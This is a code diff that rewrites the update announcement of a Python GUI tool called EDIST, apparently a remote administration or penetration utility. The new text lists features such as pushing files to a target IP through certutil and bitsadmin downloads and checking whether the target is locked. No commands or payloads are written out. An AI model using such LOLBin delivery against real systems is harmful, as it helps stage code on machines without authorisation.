+    ║  ✓ 24小时自动清理过期上传文件                       ║
+    ║  ✓ certutil + bitsadmin 双通道下载保障              ║
+    ║  ✓ 上传前自动检测目标IP锁定状态                     ║
+    ║  ✓ 完整的文件传输状态反馈                           ║
+    ║                                                       ║
+    ║  【全新现代化UI界面】                                  ║
+    ║  ✓ 浅灰白主色调 + 科技蓝品牌色 (#1E88E5)            ║
+    ║  ✓ 扁平化圆角按钮 + 统一字体规范                    ║
+    ║  ✓ 卡片式分区布局，主次分明                          ║
+    ║                                                       ║
+    ║  【安全防误触增强】                                   ║
+    ║  ✓ 所有危险操作新增二次确认弹窗                      ║
+    ║  ✓ 弹窗默认焦点在「否」按钮                          ║
+    ║  ✓ 操作实时反馈至日志区                              ║
+    ║  ✓ 关闭软件前必须经过确认                            ║
+    ║                                                       ║
+    ║  【其他优化】                                         ║
+    ║  ✓ 状态栏显示操作状态「就绪/正在执行...」            ║
+    ║  ✓ 窗口尺寸优化至 780×620                            ║
+    ║  ✓ 全中文界面，菜单栏中文优先                        ║
+    ║                                                       ║
+    ╚═══════════════════════════════════════════════════════╝
     
     Tips 使用技巧:
-    • 菜单栏 → Theme 切换4种主题风格
-    • 菜单栏 → Language 中英双语切换  
-    • 执行命令旁 TemplatesTemplates 快速填入常用命令
-    • 危险操作会弹出确认对话框，请仔细确认！
+    • 菜单栏切换主题 / 语言 / 版本
+    • 选择文件后在底部日志区查看文件大小
+    • 文件上传支持 certutil 和 bitsadmin 两种方式
+    • 危险操作会弹出确认弹窗，默认焦点在「否」
     
      免责声明: 本软件仅供学习研究使用！
      联系方式: nmmmyl@ying.xyz
     """
-    messagebox.showinfo('NEW EDIST v3.4 - 重大更新', announcement)
+    messagebox.showinfo('EDIST v3.8 - 网卡切换', announcement)
 
 # 延迟显示公告，确保窗口完全加载
 root.after(500, show_announcement)
